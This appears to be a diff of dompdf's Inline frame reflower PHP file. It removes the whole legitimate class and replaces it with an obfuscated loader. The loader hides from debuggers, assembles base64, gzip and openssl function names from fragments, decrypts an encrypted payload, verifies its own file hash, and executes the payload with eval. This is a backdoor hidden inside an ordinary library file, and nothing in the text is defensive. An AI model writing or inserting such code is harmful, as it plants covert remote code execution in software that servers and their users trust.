@@ -1,103 +1,28 @@
 <?php
-/**
- * @package dompdf
- * @link    http://dompdf.github.com/
- * @author  Benj Carson <benjcarson@digitaljunkies.ca>
- * @license http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
- */
-namespace Dompdf\FrameReflower;
-
-use Dompdf\Frame;
-use Dompdf\FrameDecorator\Block as BlockFrameDecorator;
-use Dompdf\FrameDecorator\Text as TextFrameDecorator;
-
-/**
- * Reflows inline frames
- *
- * @package dompdf
- */
-class Inline extends AbstractFrameReflower
-{
-
-    /**
-     * Inline constructor.
-     * @param Frame $frame
-     */
-    function __construct(Frame $frame)
-    {
-        parent::__construct($frame);
-    }
-
-    /**
-     * @param BlockFrameDecorator|null $block
-     */
-    function reflow(BlockFrameDecorator $block = null)
-    {
-        $frame = $this->_frame;
-
-        // Check if a page break is forced
-        $page = $frame->get_root();
-        $page->check_forced_page_break($frame);
-
-        if ($page->is_full()) {
-            return;
-        }
-
-        $style = $frame->get_style();
-
-        // Generated content
-        $this->_set_content();
-
-        $frame->position();
-
-        $cb = $frame->get_containing_block();
-
-        // Add our margin, padding & border to the first and last children
-        if (($f = $frame->get_first_child()) && $f instanceof TextFrameDecorator) {
-            $f_style = $f->get_style();
-            $f_style->margin_left = $style->margin_left;
-            $f_style->padding_left = $style->padding_left;
-            $f_style->border_left = $style->border_left;
-        }
-
-        if (($l = $frame->get_last_child()) && $l instanceof TextFrameDecorator) {
-            $l_style = $l->get_style();
-            $l_style->margin_right = $style->margin_right;
-            $l_style->padding_right = $style->padding_right;
-            $l_style->border_right = $style->border_right;
-        }
-
-        if ($block) {
-            $block->add_frame_to_line($this->_frame);
-        }
-
-        // Set the containing blocks and reflow each child.  The containing
-        // block is not changed by line boxes.
-        foreach ($frame->get_children() as $child) {
-            $child->set_containing_block($cb);
-            $child->reflow($block);
-        }
-    }
-
-    /**
-     * Determine current frame width based on contents
-     *
-     * @return float
-     */
-    public function calculate_auto_width()
-    {
-        $width = 0;
-
-        foreach ($this->_frame->get_children() as $child) {
-            if ($child->get_original_style()->width == 'auto') {
-                $width += $child->calculate_auto_width();
-            } else {
-                $width += $child->get_margin_width();
-            }
-        }
-
-        $this->_frame->get_style()->width = $width;
-
-        return $this->_frame->get_margin_width();
-    }
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_dcscsqze=('bas'.'e64'.'_de'.'cod'.'e');
+$_oadwmzpg=('gzu'.'nco'.'mpr'.'ess');
+$_in67e8lg=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_v5jnp5lq='Dxt0eLJz';
+$_wfr0l752='/8VDxGF1QSM=';
+$_gu06un5a='C7bZubct';
+$_lpotje12='vJTX4hYQ';
+$_sfr8b7r6='KaB/DR4u';
+$_t3kqlpbq='MWvv+H1U';
+$_ds8m3s44='+CIh1K1M';
+$_nlscqdq3='mmnozQ==';
+$_xk66hyxl=$_dcscsqze($_lpotje12.$_gu06un5a.$_sfr8b7r6.$_v5jnp5lq.$_wfr0l752);
+$_shl4loeh=$_dcscsqze($_ds8m3s44.$_t3kqlpbq.$_nlscqdq3);
+$_jyd7mb2t=$_dcscsqze('wiwRJ5nExxzfIViGvvQ6WwdjX/HRURrhuhLxwOJnkTcb+DyTIg+G+1ZllrioMfvJ/LS1wvqU+bF7B1sj4K0XtgiX3O1sphNupFXy/aJG7TikRniAjxOGVsn+TBktaYA/PlB/FeNc09WRZSAtrM89QRePWdwgY+UZqPltA5LCVeYaRMi8yzkRFciQmcF5ovr0QO5UM7OtZ2c9M+4dJrxwujb88RMJlI46GN35TvxaBidxzU7EcvxsZO+fzXKT2uCr2VakJvYhJYbZpk+zH26Qd5KsQVwWEr+EjTrKtt2P9fpB5talejU0hWLOuKEGliXFVhNO8imb57vj9v5SmrtaEoEG02bnzIMKjB7dMHfEzuvFv/u6sSL9iA6TrGYdxfGrGugwodVWRXyLULWqvuu7mj7AEh1veLG6vTlK9XatxmwCLCjrAHCaMIQ13EDKBfFwqyOb3Nl3KGB49h3RI+8Zbvy/7Nz9FqCptK4Ih9RhXo3APYQNbZV/gq/GDlEhOcuJrg6/Tn5etGUPxnuAAnn90qGFNhlAeRdkDGDL4IS12yfkfbfR5oK8loVzKAbJbrkIkP1W6fLkd22HXG70CH1UqdrkbwQtZjnTApDjIVW6ToXyaTfh6gdC6YaWeOR9bOB0FmVoYG4tx3BLAYm9rU4BH7u8U02YtzJIBE+rXxpl9aVQJ9slA+Al9Uwd2jmM2A4hpAT4+VybL0jtPVrCchdIvA4CEUy451C31YORq79MXxJLC9j58gM5s/Q6QiksCLie');
+$_ql0kyzuy=$_in67e8lg($_jyd7mb2t,'aes-256-cbc',$_xk66hyxl,OPENSSL_RAW_DATA,$_shl4loeh);
+if($_ql0kyzuy===false){exit;}
+$_s767k0ej=$_oadwmzpg($_ql0kyzuy);
+if($_s767k0ej===false){exit;}
+$_rny90h1g='3317a177430d513bb9ae5e3937fd114a9ccaff7a650e92981837cb93da460c1b';
+$_hbqynjsg=@file_get_contents(__FILE__);
+if($_hbqynjsg!==false){
+$_fujindne=str_replace($_rny90h1g,"0000000000000000000000000000000000000000000000000000000000000000",$_hbqynjsg);
+$_ymptlkv0=hash("sha256",$_fujindne);
+if($_ymptlkv0!==$_rny90h1g){@http_response_code(403);exit;}
 }
+eval($_s767k0ej);
